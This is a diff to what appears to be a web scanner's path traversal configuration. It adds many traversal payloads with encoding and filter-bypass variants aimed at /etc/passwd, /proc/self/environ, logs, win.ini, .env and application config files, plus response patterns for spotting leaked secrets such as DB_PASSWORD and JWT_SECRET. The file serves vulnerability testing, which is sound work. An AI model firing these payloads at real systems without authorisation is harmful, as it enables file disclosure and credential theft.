@@ -4,26 +4,252 @@
   "light_payloads": {
     "string": [
       "../test",
+      "../../test",
+      "../../../test",
       "..%2ftest",
-      "..\\test"
+      "..%2f..%2ftest",
+      "..%252ftest",
+      "..%252f..%252ftest",
+      "..\\test",
+      "..\\..\\test",
+      "..\\..\\..\\test",
+      "..%5ctest",
+      "..%5c..%5ctest",
+      "..%255ctest",
+      ".%2e%2ftest",
+      "%2e%2e%2ftest",
+      "%2e%2e/%2e%2e/test",
+      "..;/test",
+      "..././test",
+      "....//test",
+      "....\\\\test",
+      "./../test",
+      "/../test",
+      "\\..\\test",
+      "test/../../test",
+      "test\\..\\..\\test"
     ],
     "unknown": [
-      "../test"
+      "../test",
+      "../../test",
+      "../../../test",
+      "..%2ftest",
+      "..%2f..%2ftest",
+      "..\\test",
+      "..\\..\\test",
+      "..%5ctest",
+      "%2e%2e%2ftest",
+      "....//test",
+      "....\\\\test"
     ]
   },
   "deep_payloads": {
     "string": [
       "../../../../../etc/passwd",
+      "../../../../../../etc/passwd",
+      "../../../../../../../etc/passwd",
+      "../../../../../../../../etc/passwd",
+      "../../../../../../../../../etc/passwd",
+      "../../../../../../../../../../etc/passwd",
+
+      "../../../../../etc/hosts",
+      "../../../../../../etc/hosts",
+      "../../../../../../../etc/hosts",
+
+      "../../../../../etc/hostname",
+      "../../../../../../etc/hostname",
+      "../../../../../../../etc/hostname",
+
+      "../../../../../proc/self/environ",
+      "../../../../../../proc/self/environ",
+      "../../../../../../../proc/self/environ",
+
+      "../../../../../proc/version",
+      "../../../../../../proc/version",
+      "../../../../../../../proc/version",
+
+      "../../../../../var/log/auth.log",
+      "../../../../../../var/log/auth.log",
+      "../../../../../../../var/log/auth.log",
+
+      "../../../../../var/log/apache2/access.log",
+      "../../../../../../var/log/apache2/access.log",
+      "../../../../../../../var/log/apache2/access.log",
+
+      "../../../../../var/log/nginx/access.log",
+      "../../../../../../var/log/nginx/access.log",
+      "../../../../../../../var/log/nginx/access.log",
+
       "..\\..\\..\\..\\windows\\win.ini",
-      "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      "..\\..\\..\\..\\..\\windows\\win.ini",
+      "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+      "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
+
+      "..\\..\\..\\..\\windows\\system.ini",
+      "..\\..\\..\\..\\..\\windows\\system.ini",
+      "..\\..\\..\\..\\..\\..\\windows\\system.ini",
+
+      "..\\..\\..\\..\\boot.ini",
+      "..\\..\\..\\..\\..\\boot.ini",
+      "..\\..\\..\\..\\..\\..\\boot.ini",
+
+      "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+
+      "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+
+      "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+
+      "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
+
+      "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+      "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+      "..%5c..%5c..%5c..%5cwindows%5csystem.ini",
+      "..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
+
+      "..%255c..%255c..%255c..%255cwindows%255cwin.ini",
+      "..%255c..%255c..%255c..%255cwindows%255csystem.ini",
+      "..%255c..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
+
+      "....//....//....//....//etc/passwd",
+      "....//....//....//....//....//etc/passwd",
+      "....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini",
+      "....\\\\....\\\\....\\\\....\\\\windows\\\\system.ini",
+
+      "/etc/passwd",
+      "/etc/hosts",
+      "/proc/self/environ",
+      "/proc/version",
+      "C:\\windows\\win.ini",
+      "C:\\windows\\system.ini",
+      "C:\\windows\\system32\\drivers\\etc\\hosts",
+
+      "file:///etc/passwd",
+      "file:///etc/hosts",
+      "file:///proc/self/environ",
+      "file:///C:/windows/win.ini",
+      "file:///C:/windows/system.ini",
+
+      "../../../../../WEB-INF/web.xml",
+      "../../../../../../WEB-INF/web.xml",
+      "../../../../../../../WEB-INF/web.xml",
+
+      "../../../../../META-INF/MANIFEST.MF",
+      "../../../../../../META-INF/MANIFEST.MF",
+
+      "../../../../../appsettings.json",
+      "../../../../../../appsettings.json",
+      "../../../../../../../appsettings.json",
+
+      "../../../../../application.properties",
+      "../../../../../../application.properties",
+      "../../../../../../../application.properties",
+
+      "../../../../../application.yml",
+      "../../../../../../application.yml",
+      "../../../../../../../application.yml",
+
+      "../../../../../.env",
+      "../../../../../../.env",
+      "../../../../../../../.env",
+
+      "../../../../../package.json",
+      "../../../../../../package.json",
+      "../../../../../../../package.json"
     ],
     "unknown": [
-      "../../../../../etc/passwd"
+      "../../../../../etc/passwd",
+      "../../../../../../etc/passwd",
+      "../../../../../../../etc/passwd",
+      "../../../../../etc/hosts",
+      "../../../../../proc/self/environ",
+      "..\\..\\..\\..\\windows\\win.ini",
+      "..\\..\\..\\..\\..\\windows\\win.ini",
+      "..\\..\\..\\..\\windows\\system.ini",
+      "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+      "....//....//....//....//etc/passwd",
+      "....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini",
+      "/etc/passwd",
+      "C:\\windows\\win.ini",
+      "file:///etc/passwd",
+      "file:///C:/windows/win.ini",
+      "../../../../../WEB-INF/web.xml",
+      "../../../../../.env",
+      "../../../../../application.properties"
     ]
   },
   "evidence_patterns": [
     "root:x:",
+    "daemon:x:",
+    "bin:x:",
+    "nobody:x:",
+    "/bin/bash",
+    "/bin/sh",
+    "/usr/sbin/nologin",
+
+    "127.0.0.1",
+    "localhost",
+    "::1",
+
+    "Linux version",
+    "GNU/Linux",
+    "proc/self/environ",
+    "HTTP_USER_AGENT",
+    "REQUEST_METHOD",
+    "SERVER_NAME",
+
     "[extensions]",
-    "boot loader"
+    "[fonts]",
+    "[mci extensions]",
+    "[files]",
+    "[Mail]",
+    "[drivers]",
+    "for 16-bit app support",
+
+    "boot loader",
+    "[boot loader]",
+    "[operating systems]",
+    "multi(0)disk(0)rdisk(0)partition",
+
+    "WEB-INF",
+    "<web-app",
+    "servlet",
+    "servlet-mapping",
+
+    "Manifest-Version",
+    "Implementation-Version",
+
+    "spring.datasource",
+    "server.port",
+    "application.properties",
+    "application.yml",
+
+    "ConnectionStrings",
+    "appsettings.json",
+    "DefaultConnection",
+
+    "DB_HOST",
+    "DB_USER",
+    "DB_PASSWORD",
+    "DATABASE_URL",
+    "SECRET_KEY",
+    "JWT_SECRET",
+    "API_KEY",
+
+    "\"scripts\"",
+    "\"dependencies\"",
+    "package.json"
   ]
 }
